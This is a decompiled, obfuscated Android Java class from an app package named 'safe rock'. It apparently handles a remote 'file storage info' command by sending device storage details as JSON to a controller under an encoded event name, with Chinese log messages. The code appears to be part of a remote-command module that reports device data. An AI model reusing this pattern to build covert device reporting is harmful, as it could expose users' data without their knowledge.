package com.storm.safe.rock.service.modules.command;

import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.C1496yx;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.FileCommandHandler$handleFileStorageInfo$2", m214403f = "FileCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class FileCommandHandler$handleFileStorageInfo$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C1496yx f53499a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53500a2;

    /* renamed from: a3 */
    public final /* synthetic */ C0323a8 f53501a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public FileCommandHandler$handleFileStorageInfo$2(C1496yx c1496yx, String str, C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53499a1 = c1496yx;
        this.f53500a2 = str;
        this.f53501a3 = c0323a8;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new FileCommandHandler$handleFileStorageInfo$2(this.f53499a1, this.f53500a2, this.f53501a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((FileCommandHandler$handleFileStorageInfo$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0323a8 c0323a8 = this.f53501a3;
        String str = this.f53500a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            JSONObject jSONObjectM215315a6 = this.f53499a1 != null ? C1496yx.m215315a6() : new JSONObject();
            jSONObjectM215315a6.put("requestId", str);
            if (c0323a8 != null) {
                c0323a8.m211658c4(StringUtil.m212470a0("LVAdP3IqCT1HPiVKFA=="), jSONObjectM215315a6);
            }
            t60.m214714d6("FileCmdHandler", "存储信息已发送");
            return new Integer(0);
        } catch (Exception e) {
            t60.m214705c6("FileCmdHandler", "获取存储信息失败", e);
            if (c0323a8 == null) {
                return null;
            }
            String strM212470a0 = StringUtil.m212470a0("LVAdP3IqCT1HPiVKFA==");
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("requestId", str);
            String message = e.getMessage();
            if (message == null) {
                message = "未知错误";
            }
            jSONObject.put("error", message);
            c0323a8.m211658c4(strM212470a0, jSONObject);
            return C1351vv.f60710b1;
        }
    }
}
